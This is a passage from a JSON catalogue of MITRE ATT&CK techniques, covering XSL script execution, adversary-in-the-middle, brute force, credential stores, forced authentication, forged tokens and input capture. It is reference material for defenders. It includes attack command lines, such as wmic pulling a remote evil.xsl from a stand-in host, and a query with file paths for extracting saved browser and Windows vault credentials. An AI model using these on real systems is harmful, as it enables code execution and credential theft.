    "description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.[1]Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar toTrusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe)[2]can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.[3]Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.[4]Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.[5]Command-line examples:[3][5]msxsl.exe customers[.]xml script[.]xslmsxsl.exe script[.]xsl script[.]xslmsxsl.exe script[.]jpeg script[.]jpegAnother variation of this technique, dubbed \"Squiblytwo\", involves usingWindows Management Instrumentationto invoke JScript or VBScript within an XSL file.[6]This technique can also execute local/remote scripts and, similar to itsRegsvr32/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias inWindows Management Instrumentationprovided they utilize the /FORMAT switch.[5]Command-line examples:[5][6]Local File:wmic process list /FORMAT:evil[.]xslRemote File:wmic os get /FORMAT:\"https[:]//example[.]com/evil[.]xsl\"",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:31.675206",
    "subtechniques": []
  },
  {
    "technique_id": "T1557",
    "name": "Adversary-in-the-Middle",
    "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such asNetwork Sniffing,Transmitted Data Manipulation, or replay attacks (Exploitation for Credential Access). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.[1]For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.[2][3][4]Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens (Steal Application Access Token) and session cookies (Steal Web Session Cookie).[5][6]Downgrade Attacks can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.[7][8][9]Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as inTransmitted Data Manipulation. Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially toImpair Defensesand/or in support of aNetwork Denial of Service.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:35.031956",
    "subtechniques": [
      {
        "id": "T1557.001",
        "name": "LLMNR/NBT-NS Poisoning and SMB Relay"
      },
      {
        "id": "T1557.002",
        "name": "ARP Cache Poisoning"
      },
      {
        "id": "T1557.003",
        "name": "DHCP Spoofing"
      }
    ]
  },
  {
    "technique_id": "T1557.001",
    "name": "LLMNR/NBT-NS Poisoning and SMB Relay",
    "description": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.[1][2]Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or throughNetwork Sniffingand crack the hashes offline throughBrute Forceto obtain the plaintext passwords.In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.[3][4]Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, andResponder.[5][6][7]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Adversary-in-the-Middle",
    "parent_technique_id": "T1557",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:38.439484"
  },
  {
    "technique_id": "T1557.002",
    "name": "ARP Cache Poisoning",
    "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such asNetwork SniffingorTransmitted Data Manipulation.The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.[1]Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.[2][3]Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.[2]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Adversary-in-the-Middle",
    "parent_technique_id": "T1557",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:41.803399"
  },
  {
    "technique_id": "T1557.003",
    "name": "DHCP Spoofing",
    "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such asNetwork SniffingorTransmitted Data Manipulation.DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.[1]The typical server-client interaction is as follows:The client broadcasts aDISCOVERmessage.The server responds with anOFFERmessage, which includes an available network address.The client broadcasts aREQUESTmessage, which includes the network address offered.The server acknowledges with anACKmessage and the client receives the network configuration parameters.Adversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.[2][3]Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.DHCPv6 clients can receive network configuration information without being assigned an IP address by sending aINFORMATION-REQUEST (code 11)message to theAll_DHCP_Relay_Agents_and_Serversmulticast address.[4]Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.Rather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e,Service Exhaustion Flood) by generating many broadcast DISCOVER messages to exhaust a networkâ€™s DHCP allocation pool.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Adversary-in-the-Middle",
    "parent_technique_id": "T1557",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:45.130175"
  },
  {
    "technique_id": "T1110",
    "name": "Brute Force",
    "description": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.[1]Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism.[2]Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access toValid Accountswithin a victim environment leveraging knowledge gathered from other post-compromise behaviors such asOS Credential Dumping,Account Discovery, orPassword Policy Discovery. Adversaries may also combine brute forcing activity with behaviors such asExternal Remote Servicesas part of Initial Access.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:48.465351",
    "subtechniques": [
      {
        "id": "T1110.001",
        "name": "Password Guessing"
      },
      {
        "id": "T1110.002",
        "name": "Password Cracking"
      },
      {
        "id": "T1110.003",
        "name": "Password Spraying"
      },
      {
        "id": "T1110.004",
        "name": "Credential Stuffing"
      }
    ]
  },
  {
    "technique_id": "T1110.001",
    "name": "Password Guessing",
    "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.[1]Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:SSH (22/TCP)Telnet (23/TCP)FTP (21/TCP)NetBIOS / SMB / Samba (139/TCP & 445/TCP)LDAP (389/TCP)Kerberos (88/TCP)RDP / Terminal Services (3389/TCP)HTTP/HTTP Management Services (80/TCP & 443/TCP)MSSQL (1433/TCP)Oracle (1521/TCP)MySQL (3306/TCP)VNC (5900/TCP)SNMP (161/UDP and 162/TCP/UDP)In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.[2]. Further, adversaries may abuse network device interfaces (such aswlanAPI) to brute force accessible wifi-router(s) via wireless authentication protocols.[3]In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Brute Force",
    "parent_technique_id": "T1110",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:51.798964"
  },
  {
    "technique_id": "T1110.002",
    "name": "Password Cracking",
    "description": "Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained.OS Credential Dumpingcan be used to obtain password hashes, this may only get an adversary so far whenPass the Hashis not an option. Further,  adversaries may leverageData from Configuration Repositoryin order to obtain hashed credentials for network devices.[1]Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.[2]The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Brute Force",
    "parent_technique_id": "T1110",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:55.143788"
  },
  {
    "technique_id": "T1110.003",
    "name": "Password Spraying",
    "description": "Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.[1]Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:SSH (22/TCP)Telnet (23/TCP)FTP (21/TCP)NetBIOS / SMB / Samba (139/TCP & 445/TCP)LDAP (389/TCP)Kerberos (88/TCP)RDP / Terminal Services (3389/TCP)HTTP/HTTP Management Services (80/TCP & 443/TCP)MSSQL (1433/TCP)Oracle (1521/TCP)MySQL (3306/TCP)VNC (5900/TCP)In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.[2]In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Brute Force",
    "parent_technique_id": "T1110",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:58.479292"
  },
  {
    "technique_id": "T1110.004",
    "name": "Credential Stuffing",
    "description": "Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:SSH (22/TCP)Telnet (23/TCP)FTP (21/TCP)NetBIOS / SMB / Samba (139/TCP & 445/TCP)LDAP (389/TCP)Kerberos (88/TCP)RDP / Terminal Services (3389/TCP)HTTP/HTTP Management Services (80/TCP & 443/TCP)MSSQL (1433/TCP)Oracle (1521/TCP)MySQL (3306/TCP)VNC (5900/TCP)In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.[1]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Brute Force",
    "parent_technique_id": "T1110",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:01.803365"
  },
  {
    "technique_id": "T1555",
    "name": "Credentials from Password Stores",
    "description": "Adversaries may search for common password storage locations to obtain user credentials.[1]Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:05.141368",
    "subtechniques": [
      {
        "id": "T1555.003",
        "name": "Credentials from Web Browsers"
      },
      {
        "id": "T1555.004",
        "name": "Windows Credential Manager"
      },
      {
        "id": "T1555.005",
        "name": "Password Managers"
      }
    ]
  },
  {
    "technique_id": "T1555.003",
    "name": "Credentials from Web Browsers",
    "description": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.[1]Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file,AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Dataand executing a SQL query:SELECT action_url, username_value, password_value FROM logins;. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API functionCryptUnprotectData, which uses the victimâ€™s cached logon credentials as the decryption key.[2]Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.[3][4]Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by theWindows Credential Manager.Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.[5]After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Credentials from Password Stores",
    "parent_technique_id": "T1555",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:08.526551"
  },
  {
    "technique_id": "T1555.004",
    "name": "Windows Credential Manager",
    "description": "Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).[1][2]The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part ofCredentials from Web Browsers, Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.Credential Lockers store credentials in encrypted.vcrdfiles, located under%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\. The encryption key can be found in a file namedPolicy.vpol, typically located in the same folder as the credentials.[3][4]Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms.vaultcmd.exeis a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such asCredEnumerateA, may also be absued to list credentials managed by the Credential Manager.[5][6]Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by runningrundll32.exe keymgr.dll KRShowKeyMgrthen selecting the \"Back up...\" button on the \"Stored User Names and Passwords\" GUI.Password recovery tools may also obtain plain text passwords from the Credential Manager.[4]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Credentials from Password Stores",
    "parent_technique_id": "T1555",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:11.859075"
  },
  {
    "technique_id": "T1555.005",
    "name": "Password Managers",
    "description": "Adversaries may acquire user credentials from third-party password managers.[1]Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.[1]Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.[2][3]Adversaries may extract credentials from memory viaExploitation for Credential Access.[4]Adversaries may also try brute forcing viaPassword Guessingto obtain the master password of a password manager.[5]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Credentials from Password Stores",
    "parent_technique_id": "T1555",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:15.197768"
  },
  {
    "technique_id": "T1212",
    "name": "Exploitation for Credential Access",
    "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this isMS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.[1][2]Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.[3][4][5]Such exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.[6]Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:18.528557",
    "subtechniques": []
  },
  {
    "technique_id": "T1187",
    "name": "Forced Authentication",
    "description": "Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.[1]This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.[2][3]Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e.Template Injection), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server.[4]With access to the credential hash, an adversary can perform off-lineBrute Forcecracking to gain access to plaintext credentials.[5]There are several different ways this can occur.[6]Some specifics from in-the-wild use include:A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e.Template Injection). The document can include, for example, a request similar tofile[:]//[remote address]/Normal.dotmto trigger the SMB request.[7]A modified .LNK or .SCF file with the icon filename pointing to an external reference such as\\[remote address]\\pic.pngthat will force the system to load the resource when the icon is rendered to repeatedly gather credentials.[7]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:21.842918",
    "subtechniques": []
  },
  {
    "technique_id": "T1606",
    "name": "Forge Web Credentials",
    "description": "Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.Adversaries may generate these credential materials in order to gain access to web resources. This differs fromSteal Web Session Cookie,Steal Application Access Token, and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.The generation of web credentials often requires secret values, such as passwords,Private Keys, or other cryptographic seed values.[1]Adversaries may also forge tokens by taking advantage of features such as theAssumeRoleandGetFederationTokenAPIs in AWS, which allow users to request temporary security credentials (i.e.,Temporary Elevated Cloud Access), or thezmprov gdpakcommand in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.[2][3]Once forged, adversaries may use these web credentials to access resources (ex:Use Alternate Authentication Material), which may bypass multi-factor and other authentication protection mechanisms.[4][5][6]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:25.187608",
    "subtechniques": [
      {
        "id": "T1606.001",
        "name": "Web Cookies"
      },
      {
        "id": "T1606.002",
        "name": "SAML Tokens"
      }
    ]
  },
  {
    "technique_id": "T1606.001",
    "name": "Web Cookies",
    "description": "Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.Adversaries may generate these cookies in order to gain access to web resources. This differs fromSteal Web Session Cookieand other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.[1]The generation of web cookies often requires secret values, such as passwords,Private Keys, or other cryptographic seed values.Once forged, adversaries may use these web cookies to access resources (Web Session Cookie), which may bypass multi-factor and other authentication protection mechanisms.[2][1][3]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Forge Web Credentials",
    "parent_technique_id": "T1606",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:28.519918"
  },
  {
    "technique_id": "T1606.002",
    "name": "SAML Tokens",
    "description": "An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.[1]The default lifetime of a SAML token is one hour, but the validity period can be specified in theNotOnOrAftervalue of theconditions ...element in a token. This value can be changed using theAccessTokenLifetimein aLifetimeTokenPolicy.[2]Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.[3]An adversary may utilizePrivate Keysto compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.[4]This differs fromSteal Application Access Tokenand other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.An adversary may gain administrative Entra ID privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead toUse Alternate Authentication Material, which may bypass multi-factor and other authentication protection mechanisms.[4]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Forge Web Credentials",
    "parent_technique_id": "T1606",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:31.850864"
  },
  {
    "technique_id": "T1056",
    "name": "Input Capture",
    "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g.Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g.Web Portal Capture).",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:35.187277",
    "subtechniques": [
      {
        "id": "T1056.001",
        "name": "Keylogging"
      },
      {
        "id": "T1056.002",
        "name": "GUI Input Capture"
      },
      {
        "id": "T1056.003",
        "name": "Web Portal Capture"
      },
      {
        "id": "T1056.004",
        "name": "Credential API Hooking"
      }
    ]
  },
  {
    "technique_id": "T1056.001",
    "name": "Keylogging",
    "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities whenOS Credential Dumpingefforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.[1]Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.[2]Some methods include:Hooking API callbacks used for processing keystrokes. UnlikeCredential API Hooking, this focuses solely on API functions intended for processing keystroke data.Reading raw keystroke data from the hardware buffer.Windows Registry modifications.Custom drivers.Modify System Imagemay provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.[3]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Input Capture",
    "parent_technique_id": "T1056",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:38.685448"
  },
  {
    "technique_id": "T1056.002",
    "name": "GUI Input Capture",
    "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex:Bypass User Account Control).Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.[1]This type of prompt can be used to collect credentials via various languages such asAppleScript[2][3][4]andPowerShell.[2][5][4]On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e.Unix Shell).[4]Adversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e.,Browser Information Discoveryand/orApplication Window Discovery) to spoof prompts when users are naturally accessing sensitive sites/data.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
